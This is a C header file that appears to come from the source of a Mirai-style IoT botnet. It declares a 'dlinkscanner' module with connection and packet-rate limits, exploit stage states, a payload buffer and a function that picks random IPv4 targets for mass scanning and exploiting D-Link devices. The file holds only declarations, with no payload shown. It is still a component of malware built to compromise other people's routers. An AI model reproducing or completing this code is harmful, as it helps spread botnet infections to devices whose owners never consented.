#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef SCAN_MAX
#define dlinkscanner_SCANNER_MAX_CONNS 512
#define dlinkscanner_SCANNER_RAW_PPS 720
#else
#define dlinkscanner_SCANNER_MAX_CONNS 128
#define dlinkscanner_SCANNER_RAW_PPS 160
#endif

#ifdef SCAN_MAX
#define dlinkscanner_SCANNER_RDBUF_SIZE 1024
#define dlinkscanner_SCANNER_HACK_DRAIN 64
#else
#define dlinkscanner_SCANNER_RDBUF_SIZE 256
#define dlinkscanner_SCANNER_HACK_DRAIN 64
#endif

struct dlinkscanner_scanner_connection
{
    int fd, last_recv;
    enum
    {
        dlinkscanner_SC_CLOSED,
        dlinkscanner_SC_CONNECTING,
        dlinkscanner_SC_EXPLOIT_STAGE2,
        dlinkscanner_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[dlinkscanner_SCANNER_RDBUF_SIZE];
    char payload_buf[1024];
};

void dlinkscanner_scanner_init();
void dlinkscanner_scanner_kill(void);

static void dlinkscanner_setup_connection(struct dlinkscanner_scanner_connection *);
static ipv4_t dlinkscanner_get_random_ip(void);
